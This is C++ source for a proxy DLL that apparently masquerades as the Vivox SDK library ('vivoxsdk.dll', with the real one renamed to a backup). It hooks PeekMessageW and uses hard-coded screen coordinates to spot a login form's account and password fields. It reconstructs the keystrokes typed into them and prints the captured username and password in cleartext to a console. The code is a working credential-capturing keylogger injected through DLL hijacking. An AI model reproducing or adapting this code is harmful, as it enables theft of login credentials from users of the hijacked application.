#include "HookUtil.h"
#include <iostream>
#include <string>

extern CHAR* g_OriginalModulePath = "vivoxsdk_backup.dll";

static std::wstring account;
static std::wstring password;

static bool accountFocus = false, passwordFocus = false;
size_t passwordCursor = 0;

static DetourHookInfo sPeekMessageWHook;
typedef BOOL (WINAPI *pfnPeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
BOOL WINAPI Hooked_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
{
	pfnPeekMessageW real = (pfnPeekMessageW)sPeekMessageWHook.GetOriginal();
	BOOL b = real(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

	if (wRemoveMsg == PM_NOREMOVE)
		return b;

	if (lpMsg && (lpMsg->message == WM_LBUTTONDOWN))
	{
		POINT pt = lpMsg->pt;
		ScreenToClient(lpMsg->hwnd, &pt);

// 		printf("mouse down: %d, %d\n", pt.x, pt.y);

		accountFocus = passwordFocus = false;
		if (pt.y >= 180 && pt.y < 218)
		{
			if (pt.x >= 27 && pt.x < 337)
				accountFocus = true;
		}
		else if (pt.y >= 227 && pt.y < 265)
		{
			if (pt.x >= 27 && pt.x < 337)
			{
				passwordFocus = true;
				// [42 .. 50), [50, 58), [58, 66), [62, 69), [69, 76), ... [98, 106) .. 337)
				if (pt.x < 42) // left most
					passwordCursor = 0;
				else
					passwordCursor = (pt.x - 42) / 8 + 1;

				passwordCursor = min(password.length(), passwordCursor);
			}
		}
	}

	if (lpMsg && lpMsg->message == WM_CHAR)
	{
		wchar_t ch = (wchar_t)lpMsg->wParam;
		if (iswprint(ch))
		{
			std::wcout << L"char: " << ch;
			printf(" %d %d %d\n", (int)accountFocus, (int)passwordFocus, (int)passwordCursor);

			if (accountFocus)
			{
				account += std::wstring(1, ch);
			}
			else if (passwordFocus)
			{
				password.insert(passwordCursor, 1, ch);
				passwordCursor++;
			}

			std::wcout << L"accout: " << account << L"\tpassword: " << password << std::endl;
		}
		else
		{
			std::wcout << L"invalid character: " << (int) ch << std::endl;
		}
	}

	if (lpMsg && lpMsg->message == WM_KEYDOWN)
	{
		printf("hwnd: %p, msg: %d, wparam: %d, lparam: %d, wRemoveMsg: %d\n",
			   lpMsg->hwnd, lpMsg->message, lpMsg->wParam, lpMsg->lParam, wRemoveMsg);

		if (lpMsg->wParam == VK_LEFT)
		{
			if (passwordFocus)
				--passwordCursor;
		}
		else if (lpMsg->wParam == VK_RIGHT)
		{
			if (passwordFocus)
				++passwordCursor;
		}
		else if (lpMsg->wParam == VK_DELETE)
		{
			if (passwordFocus && passwordCursor < password.size())
			{
				password.erase(passwordCursor, 1);
				std::wcout << L"password: " << password << std::endl;
			}
		}
		else if (lpMsg->wParam == VK_BACK)
		{
			if (passwordFocus && passwordCursor > 0)
			{
				password.erase(passwordCursor - 1, 1);
				std::wcout << L"password: " << password << std::endl;
				--passwordCursor;
			}
		}
		else if (lpMsg->wParam == VK_RETURN)
		{
			accountFocus = passwordFocus = false;
			std::wcout << 
				"*******************************************\n" <<
				account << L"\n" <<
				password << L"\n" <<
				L"*******************************************\n";

			password = L"";
			passwordCursor = 0;
		}
		else if (lpMsg->wParam == VK_TAB)
		{
			if (accountFocus)
			{
				accountFocus = false;
				passwordFocus = true;
				passwordCursor = 0;
			}
		}
		else if (lpMsg->wParam == VK_HOME)
		{
			if (passwordFocus)
				passwordCursor = 0;
		}
		else if (lpMsg->wParam == VK_END)
		{
			if (passwordFocus)
				passwordCursor = password.size();
		}
	}
	return b;
}

extern void InitWhenProcessAttach(HMODULE hModule)
{
	AllocConsole();
	freopen("CONOUT$", "wt", stdout);
	freopen("CONIN$", "rt", stdin);

	HMODULE user32Module = LoadLibrary("user32.dll");
	sPeekMessageWHook = DetourHookInfo(user32Module, "PeekMessageW", (FARPROC)&Hooked_PeekMessageW);
	sPeekMessageWHook.InstallHook();
}
